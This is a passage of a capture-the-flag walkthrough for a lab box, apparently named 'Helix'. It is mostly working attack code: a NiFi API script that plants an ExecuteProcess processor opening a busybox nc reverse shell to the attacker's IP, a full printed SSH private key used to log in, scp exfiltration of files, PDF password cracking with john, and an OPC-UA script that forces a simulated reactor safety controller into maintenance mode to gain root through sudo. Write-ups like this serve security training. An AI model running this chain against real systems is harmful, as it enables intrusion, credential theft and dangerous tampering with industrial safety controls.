+<h3 id="Drop-an-ExecuteProcess-processor-that-calls-back"><a href="#Drop-an-ExecuteProcess-processor-that-calls-back" class="headerlink" title="Drop an ExecuteProcess processor that calls back"></a>Drop an <code>ExecuteProcess</code> processor that calls back</h3><p>The non-obvious bit is the <code>Argument Delimiter</code> property. NiFi’s default delimiter is whitespace, which corrupts <code>bash -c &quot;&lt;multi-word command&gt;&quot;</code> because every space becomes a token boundary. Setting it to <code>|</code> lets us ship <code>-c|&lt;full command&gt;</code> as exactly two clean tokens. The target ships <code>busybox</code>, so <code>busybox nc -e /bin/bash</code> works (the host <code>nc</code> is the OpenBSD variant without <code>-e</code>).</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /tmp/helix/exploit_nifi.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">TARGET, IP, PORT = <span class="string">&quot;http://flow.helix.htb/nifi-api&quot;</span>, <span class="string">&quot;10.10.17.248&quot;</span>, <span class="number">9001</span></span><br><span class="line">REV = <span class="string">f&quot;busybox nc <span class="subst">&#123;IP&#125;</span> <span class="subst">&#123;PORT&#125;</span> -e /bin/bash&quot;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">root = s.get(<span class="string">f&quot;<span class="subst">&#123;TARGET&#125;</span>/process-groups/root&quot;</span>).json()[<span class="string">&quot;id&quot;</span>]</span><br><span class="line"></span><br><span class="line">create = s.post(<span class="string">f&quot;<span class="subst">&#123;TARGET&#125;</span>/process-groups/<span class="subst">&#123;root&#125;</span>/processors&quot;</span>, json=&#123;</span><br><span class="line">    <span class="string">&quot;revision&quot;</span>: &#123;<span class="string">&quot;version&quot;</span>: <span class="number">0</span>&#125;,</span><br><span class="line">    <span class="string">&quot;component&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;PwnExec&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;org.apache.nifi.processors.standard.ExecuteProcess&quot;</span>,</span><br><span class="line">        <span class="string">&quot;config&quot;</span>: &#123;<span class="string">&quot;properties&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Command&quot;</span>: <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Command Arguments&quot;</span>: <span class="string">f&quot;-c|<span class="subst">&#123;REV&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Argument Delimiter&quot;</span>: <span class="string">&quot;|&quot;</span>,</span><br><span class="line">        &#125;&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;).json()</span><br><span class="line">proc_id, ver = create[<span class="string">&quot;id&quot;</span>], create[<span class="string">&quot;revision&quot;</span>][<span class="string">&quot;version&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># auto-terminate the &#x27;success&#x27; relationship or the processor will refuse to start</span></span><br><span class="line">cfg = s.put(<span class="string">f&quot;<span class="subst">&#123;TARGET&#125;</span>/processors/<span class="subst">&#123;proc_id&#125;</span>&quot;</span>, json=&#123;</span><br><span class="line">    <span class="string">&quot;revision&quot;</span>: &#123;<span class="string">&quot;version&quot;</span>: ver&#125;,</span><br><span class="line">    <span class="string">&quot;component&quot;</span>: &#123;<span class="string">&quot;id&quot;</span>: proc_id,</span><br><span class="line">                  <span class="string">&quot;config&quot;</span>: &#123;<span class="string">&quot;autoTerminatedRelationships&quot;</span>: [<span class="string">&quot;success&quot;</span>]&#125;&#125;,</span><br><span class="line">&#125;).json()</span><br><span class="line">ver = cfg[<span class="string">&quot;revision&quot;</span>][<span class="string">&quot;version&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># flip to RUNNING — this is what actually fires the command</span></span><br><span class="line">s.put(<span class="string">f&quot;<span class="subst">&#123;TARGET&#125;</span>/processors/<span class="subst">&#123;proc_id&#125;</span>&quot;</span>, json=&#123;</span><br><span class="line">    <span class="string">&quot;revision&quot;</span>: &#123;<span class="string">&quot;version&quot;</span>: ver&#125;,</span><br><span class="line">    <span class="string">&quot;component&quot;</span>: &#123;<span class="string">&quot;id&quot;</span>: proc_id, <span class="string">&quot;state&quot;</span>: <span class="string">&quot;RUNNING&quot;</span>&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] processor running&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /tmp/helix/exploit_nifi.py</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] processor running</span><br></pre></td></tr></table></figure></div>
+
+<p>And in the listener we catch the callback:</p>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] connected from (&#x27;10.129.28.235&#x27;, 49664)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Where-we-landed"><a href="#Where-we-landed" class="headerlink" title="Where we landed"></a>Where we landed</h3><p>We fire a couple of commands through the FIFO to see who we are:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;id; hostname; pwd&#x27;</span> &gt; /tmp/helix/cmd.fifo</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uid=998(nifi) gid=998(nifi)</span><br><span class="line">helix</span><br><span class="line">/opt/nifi-1.21.0</span><br></pre></td></tr></table></figure></div>
+
+<p><code>nifi</code> is a service account, not a user with a home directory. The flag lives one pivot away.</p>
+<h2 id="Pivot-to-operator"><a href="#Pivot-to-operator" class="headerlink" title="Pivot to operator"></a>Pivot to <code>operator</code></h2><h3 id="Find-a-cached-SSH-key"><a href="#Find-a-cached-SSH-key" class="headerlink" title="Find a cached SSH key"></a>Find a cached SSH key</h3><p>NiFi support-bundles are full of secrets in real-world deployments — somebody on this team left one in place. We list the directory:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;ls /opt/nifi-1.21.0/support-bundles/&#x27;</span> &gt; /tmp/helix/cmd.fifo</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">operator_id_ed25519.bak</span><br></pre></td></tr></table></figure></div>
+
+<p>That’s a backup private key. We read it out:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak&#x27;</span> &gt; /tmp/helix/cmd.fifo</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span><br><span class="line">QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn</span><br><span class="line">WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw</span><br><span class="line">AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8</span><br><span class="line">tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
+
+<p>The key’s comment field is <code>root@management</code>, but on this host it actually maps to the <code>operator</code> user — the username baked into a backup key is meaningless; what matters is which <code>authorized_keys</code> file it appears in.</p>
+<h3 id="SSH-in-and-grab-user-txt"><a href="#SSH-in-and-grab-user-txt" class="headerlink" title="SSH in and grab user.txt"></a>SSH in and grab user.txt</h3><p>We write the key out locally, lock down its permissions, and log in:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /tmp/helix/operator_id_ed25519 &lt;&lt;<span class="string">&#x27;KEY&#x27;</span></span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span><br><span class="line">QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn</span><br><span class="line">WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw</span><br><span class="line">AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8</span><br><span class="line">tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line">KEY</span><br><span class="line"><span class="built_in">chmod</span> 600 /tmp/helix/operator_id_ed25519</span><br><span class="line">ssh -i /tmp/helix/operator_id_ed25519 operator@10.129.28.235 <span class="string">&#x27;id; cat ~/user.txt&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uid=1001(operator) gid=1001(operator) groups=1001(operator)</span><br><span class="line">e0cd354625ab4f0aab3d9182be414ca7</span><br></pre></td></tr></table></figure></div>
+
+<p>And there’s the user flag.</p>
+<h2 id="Loot-operator’s-home-—-and-check-sudo"><a href="#Loot-operator’s-home-—-and-check-sudo" class="headerlink" title="Loot operator’s home — and check sudo"></a>Loot operator’s home — and check sudo</h2><h3 id="What’s-in-operator"><a href="#What’s-in-operator" class="headerlink" title="What’s in ~operator"></a>What’s in ~operator</h3><p>We list the home directory and check our sudo rights in one shot:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /tmp/helix/operator_id_ed25519 operator@10.129.28.235 <span class="string">&#x27;ls -la ~; sudo -l&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">total 36</span><br><span class="line">drwxr-x--- 4 operator operator 4096 Apr 12  2026 .</span><br><span class="line">drwxr-xr-x 3 root     root     4096 Apr 11  2026 ..</span><br><span class="line">-rw-r----- 1 root     operator   33 Apr 12  2026 user.txt</span><br><span class="line">-rw-r--r-- 1 operator operator  220 Apr 11  2026 .bash_logout</span><br><span class="line">-rw-r--r-- 1 operator operator 3771 Apr 11  2026 .bashrc</span><br><span class="line">-rw-r----- 1 operator operator  84K Apr 12  2026 control systems diagram.png</span><br><span class="line">-rw-r----- 1 operator operator 240K Apr 12  2026 Operator Control &amp; Safety Guide.pdf</span><br><span class="line">-rw-r--r-- 1 operator operator  807 Apr 11  2026 .profile</span><br><span class="line">drwx------ 2 operator operator 4096 Apr 12  2026 .ssh</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for operator on helix:</span><br><span class="line">    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User operator may run the following commands on helix:</span><br><span class="line">    (root) NOPASSWD: /usr/local/sbin/helix-maint-console</span><br></pre></td></tr></table></figure></div>
+
+<p>Two interesting files (a diagram and a safety guide PDF), and a NOPASSWD sudo entry on a binary we’ve never seen before.</p>
+<h3 id="Exfil-the-diagram-and-the-PDF"><a href="#Exfil-the-diagram-and-the-PDF" class="headerlink" title="Exfil the diagram and the PDF"></a>Exfil the diagram and the PDF</h3><p>We pull both files down to our box:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">scp -i /tmp/helix/operator_id_ed25519 \</span><br><span class="line">    <span class="string">&quot;operator@10.129.28.235:/home/operator/control\ systems\ diagram.png&quot;</span> \</span><br><span class="line">    /tmp/helix/control_systems_diagram.png</span><br><span class="line">scp -i /tmp/helix/operator_id_ed25519 \</span><br><span class="line">    <span class="string">&quot;operator@10.129.28.235:/home/operator/Operator\ Control\ \&amp;\ Safety\ Guide.pdf&quot;</span> \</span><br><span class="line">    /tmp/helix/safety_guide.pdf</span><br></pre></td></tr></table></figure></div>
+
+<p>The PNG renders an OPC-UA architecture: an Operator Station and an OPC-UA Server at <code>opc.tcp://127.0.0.1:4840/helix/</code>, exposing <strong>Reactor</strong> (<code>Temperature</code>, <code>Pressure</code>, <code>CalibrationOffset</code>), <strong>Control</strong> (<code>Mode</code>, <code>TestOverride</code>, <code>ResetTrip</code> — all writable), and <strong>Safety</strong> (<code>TripActive</code>, <code>RodsInserted</code>, <code>EmergencyCooling</code> — read-only).</p>
+<h3 id="The-PDF-is-password-protected-—-crack-it"><a href="#The-PDF-is-password-protected-—-crack-it" class="headerlink" title="The PDF is password-protected — crack it"></a>The PDF is password-protected — crack it</h3><p>The safety guide won’t open without a password, so we extract its hash and throw rockyou at it with john:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pdf2john /tmp/helix/safety_guide.pdf &gt; /tmp/helix/guide.hash</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/helix/guide.hash</span><br><span class="line">john --show /tmp/helix/guide.hash</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])</span><br><span class="line">operator1        (safety_guide.pdf)</span><br><span class="line">1g 0:00:00:00 DONE (2026-05-12 18:24) 12.50g/s 6400p/s 6400c/s 6400C/s ...</span><br><span class="line"></span><br><span class="line">safety_guide.pdf:operator1</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 1 left</span><br></pre></td></tr></table></figure></div>
+
+<p>With the password <code>operator1</code> we decrypt the document and dump its text:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pypdf <span class="keyword">import</span> PdfReader</span><br><span class="line">r = PdfReader(<span class="string">&quot;/tmp/helix/safety_guide.pdf&quot;</span>); r.decrypt(<span class="string">&quot;operator1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>.join(p.extract_text() <span class="keyword">for</span> p <span class="keyword">in</span> r.pages))</span><br></pre></td></tr></table></figure></div>
+
+<p>The key passages from the decrypted guide are:</p>
+<ul>
+<li><em>“Maintenance Operating Window opens when Temperature ≥ ~295 °C <strong>OR</strong> Pressure ≥ ~73 bar, both still below trip thresholds (305 °C &#x2F; 75 bar), and no trip is active.”</em></li>
+<li><em>“Maintenance mode requires <code>Mode = MAINTENANCE</code> and <code>TestOverride = True</code>; only then are <code>CalibrationOffset</code> ramps honoured.”</em></li>
+<li><em>“Aggressive offset ramps latch a trip; ramp slowly.”</em></li>
+</ul>
+<p>So the privesc path is clear: <strong>force the safety controller into the Maintenance Operating Window over OPC-UA, then immediately call the sudo helper while the window is still open.</strong></p>
+<h2 id="Root-—-open-the-maintenance-window-over-OPC-UA-then-sudo-helix-maint-console"><a href="#Root-—-open-the-maintenance-window-over-OPC-UA-then-sudo-helix-maint-console" class="headerlink" title="Root — open the maintenance window over OPC-UA, then sudo helix-maint-console"></a>Root — open the maintenance window over OPC-UA, then <code>sudo helix-maint-console</code></h2><h3 id="Enumerate-the-OPC-UA-tree"><a href="#Enumerate-the-OPC-UA-tree" class="headerlink" title="Enumerate the OPC-UA tree"></a>Enumerate the OPC-UA tree</h3><p><code>asyncua</code> is already installed on the box (it’s how the operator station talks to the controller). The OPC-UA listener binds to <code>127.0.0.1</code> only — invisible from the network, but reachable from our SSH session. We walk the Plant subtree to learn the node ids and current values:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /tmp/enum_opcua.py — walk the Plant subtree</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> asyncua <span class="keyword">import</span> Client</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">walk</span>(<span class="params">node, d=<span class="number">0</span></span>):</span><br><span class="line">    name = (<span class="keyword">await</span> node.read_browse_name()).Name</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        v = <span class="keyword">await</span> node.read_value()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;  &#x27;</span>*d&#125;</span><span class="subst">&#123;node.nodeid.to_string():&lt;<span class="number">14</span>&#125;</span> <span class="subst">&#123;name:&lt;<span class="number">22</span>&#125;</span> = <span class="subst">&#123;v!r&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;  &#x27;</span>*d&#125;</span><span class="subst">&#123;node.nodeid.to_string():&lt;<span class="number">14</span>&#125;</span> <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="keyword">await</span> node.get_children(): <span class="keyword">await</span> walk(c, d+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> Client(url=<span class="string">&quot;opc.tcp://127.0.0.1:4840/helix/&quot;</span>) <span class="keyword">as</span> c:</span><br><span class="line">        <span class="keyword">await</span> walk(c.get_node(<span class="string">&quot;ns=2;i=1&quot;</span>))</span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp -i /tmp/helix/operator_id_ed25519 /tmp/enum_opcua.py operator@10.129.28.235:/tmp/</span><br><span class="line">ssh -i /tmp/helix/operator_id_ed25519 operator@10.129.28.235 <span class="string">&#x27;python3 /tmp/enum_opcua.py&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ns=2;i=1   Plant</span><br><span class="line">  ns=2;i=2   Reactor</span><br><span class="line">    ns=2;i=4   Temperature        = 281.42</span><br><span class="line">    ns=2;i=5   Pressure           =  68.85</span><br><span class="line">    ns=2;i=6   CalibrationOffset  =   0.0</span><br><span class="line">  ns=2;i=7   Safety</span><br><span class="line">    ns=2;i=10  TripActive         = False</span><br><span class="line">  ns=2;i=11  Control</span><br><span class="line">    ns=2;i=12  Mode               = &#x27;NORMAL&#x27;</span><br><span class="line">    ns=2;i=13  TestOverride       = False</span><br><span class="line">    ns=2;i=14  ResetTrip          = False</span><br></pre></td></tr></table></figure></div>
+
+<p>The initial state has temperature too low (281 °C, threshold is 295), pressure too low (68 bar, threshold is 73), mode <code>NORMAL</code>, and no trip. We only need to push temperature over 295 °C, which the guide tells us we can do by ramping <code>CalibrationOffset</code> while in maintenance mode.</p>
+<h3 id="Single-process-“open-the-window-run-the-sudo-helper”-script"><a href="#Single-process-“open-the-window-run-the-sudo-helper”-script" class="headerlink" title="Single-process “open the window + run the sudo helper” script"></a>Single-process “open the window + run the sudo helper” script</h3><p>The naive approach is to use two SSH sessions — one to ramp the offset and hold it, one to call <code>sudo helix-maint-console</code>. It doesn’t work: by the time the second SSH establishes, the <code>asyncua</code> session in the first has dropped, the PLC re-zeroes <code>CalibrationOffset</code>, and the safety controller closes the window before the sudo helper checks it. The only stable approach is to do everything from a single Python process on the target — ramp the offset, hold the temperature in a background task, and <code>subprocess.run</code> the helper while the holder keeps the reactor hot:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /tmp/full_pwn.py</span></span><br><span class="line"><span class="keyword">import</span> asyncio, subprocess</span><br><span class="line"><span class="keyword">from</span> asyncua <span class="keyword">import</span> Client, ua</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">keep_hot</span>(<span class="params">cal, temp, press, trip, evt</span>):</span><br><span class="line">    offset = <span class="number">12.0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> evt.is_set():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">await</span> trip.read_value():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">await</span> temp.read_value() &lt; <span class="number">296</span> <span class="keyword">and</span> <span class="keyword">await</span> press.read_value() &lt; <span class="number">73</span>:</span><br><span class="line">            offset = <span class="built_in">min</span>(offset + <span class="number">0.5</span>, <span class="number">25.0</span>)</span><br><span class="line">            <span class="keyword">await</span> cal.write_value(ua.Variant(offset, ua.VariantType.Double))</span><br><span class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">1.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> Client(url=<span class="string">&quot;opc.tcp://127.0.0.1:4840/helix/&quot;</span>) <span class="keyword">as</span> c:</span><br><span class="line">        mode  = c.get_node(<span class="string">&quot;ns=2;i=12&quot;</span>); test  = c.get_node(<span class="string">&quot;ns=2;i=13&quot;</span>)</span><br><span class="line">        cal   = c.get_node(<span class="string">&quot;ns=2;i=6&quot;</span>)</span><br><span class="line">        temp  = c.get_node(<span class="string">&quot;ns=2;i=4&quot;</span>);  press = c.get_node(<span class="string">&quot;ns=2;i=5&quot;</span>)</span><br><span class="line">        trip  = c.get_node(<span class="string">&quot;ns=2;i=10&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> mode.write_value(ua.Variant(<span class="string">&quot;MAINTENANCE&quot;</span>, ua.VariantType.String))</span><br><span class="line">        <span class="keyword">await</span> test.write_value(ua.Variant(<span class="literal">True</span>, ua.VariantType.Boolean))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ramp slowly so the safety controller doesn&#x27;t latch a trip</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">            <span class="keyword">await</span> cal.write_value(ua.Variant(<span class="built_in">float</span>(i), ua.VariantType.Double))</span><br><span class="line">            <span class="keyword">await</span> asyncio.sleep(<span class="number">1.0</span>)</span><br><span class="line">            t = <span class="keyword">await</span> temp.read_value()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  off=<span class="subst">&#123;i:&lt;<span class="number">2</span>&#125;</span>  T=<span class="subst">&#123;t:<span class="number">.2</span>f&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> t &gt;= <span class="number">295</span>: <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        evt = asyncio.Event()</span><br><span class="line">        keeper = asyncio.create_task(keep_hot(cal, temp, press, trip, evt))</span><br><span class="line"></span><br><span class="line">        cmd = <span class="string">&quot;id; cat /root/root.txt; exit\n&quot;</span></span><br><span class="line">        r = subprocess.run([<span class="string">&quot;sudo&quot;</span>, <span class="string">&quot;-n&quot;</span>, <span class="string">&quot;/usr/local/sbin/helix-maint-console&quot;</span>],</span><br><span class="line">                           <span class="built_in">input</span>=cmd, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, timeout=<span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== STDOUT ===\n&quot;</span> + r.stdout)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== STDERR ===\n&quot;</span> + r.stderr)</span><br><span class="line">        evt.<span class="built_in">set</span>(); <span class="keyword">await</span> keeper</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure></div>
+
